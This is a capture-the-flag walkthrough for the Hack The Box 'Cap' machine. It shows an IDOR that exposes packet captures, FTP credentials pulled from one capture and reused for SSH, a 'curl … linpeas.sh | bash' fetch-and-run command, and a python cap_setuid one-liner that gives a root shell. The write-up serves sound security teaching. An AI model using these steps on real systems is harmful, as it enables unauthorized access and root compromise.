# Hack The Box â€“ Cap

> ğŸ“… Date: 20th September 2021  
> ğŸ§¾ Document No: D21.100.132  
> ğŸ§‘â€ğŸ’» Prepared By: MinatoTW  
> ğŸ› ï¸ Machine Author: infosecjack  
> ğŸ§  Difficulty: Easy  
> ğŸ§© Classification: Official

---

## ğŸ§  Skills Required

- Web enumeration  
- Packet capture analysis  

## ğŸ¯ Skills Learned

- IDOR (Insecure Direct Object Reference)  
- Exploiting Linux capabilities  
- Local enumeration techniques  

---

## ğŸ” Synopsis

Cap is an easy Linux box that hosts a Python-based HTTP service with administrative features such as network capture. The web app suffers from an **IDOR vulnerability** that exposes previous packet captures. One of these reveals **plaintext FTP credentials**, granting a foothold via SSH. The final privilege escalation involves **misconfigured Linux capabilities** â€” specifically, `cap_setuid` on Python â€” allowing us to spawn a root shell.

---

## ğŸ›°ï¸ Network Scanning

### ğŸ”§ Nmap Full Port Scan

```bash
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.245
ğŸ§ª Results:

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian
80/tcp open  http    gunicorn 20.0.4 (Python WSGI HTTP Server)
ğŸš« FTP
No anonymous login allowed.

Move on to web interface on port 80.

ğŸŒ HTTP Enumeration
Gunicorn HTTP Server on Port 80
Visiting the IP shows a dashboard.

Pages like IP Config and Network Status show outputs of ifconfig and netstat.

Suggests the server runs system commands on backend.

ğŸ“¸ Security Snapshot
Clicking "Security Snapshot" triggers a capture.

Downloaded capture contains only our traffic.

ğŸ”“ IDOR Exploit
Observation:
Capture URL looks like /data/<id>

IDs are incremented integers (0, 1, 2...)

Exploit:
Accessing /data/0 gives another userâ€™s packet capture â€” IDOR vulnerability in action.

ğŸ•µï¸â€â™‚ï¸ Packet Capture Analysis
Open /data/0 capture in Wireshark:

Unencrypted FTP credentials found:

Username: nathan

Password: Buck3tH4TF0RM3!

âœ… SSH Access

ssh nathan@10.10.10.245
Password: Buck3tH4TF0RM3!
ğŸ§° Privilege Escalation â€“ Capabilities
Step 1: Run linpeas

curl http://<your-ip>/linpeas.sh | bash
Step 2: Look for capabilities
Output:

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
This is not default behavior â€” Python has dangerous privileges.

What is cap_setuid?
Allows a process to switch to any UID, including 0 (root), without needing a setuid binary.

ğŸš€ Root Shell via Python
Exploit Command:
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Confirm:
whoami
# Output: root
ğŸ Root Flag
cat /root/root.txt
ğŸ”š Conclusion
This box demonstrates how dangerous misconfigured Linux capabilities can be. Always audit binaries with getcap when doing privilege escalation enumeration. Also, never expose internal tools without proper access control â€” IDOR led directly to credential leakage.

ğŸ“š References
GTFOBins â€“ Python

Linux Capabilities â€“ RedHat Docs

Hack The Box â€“ Official Site

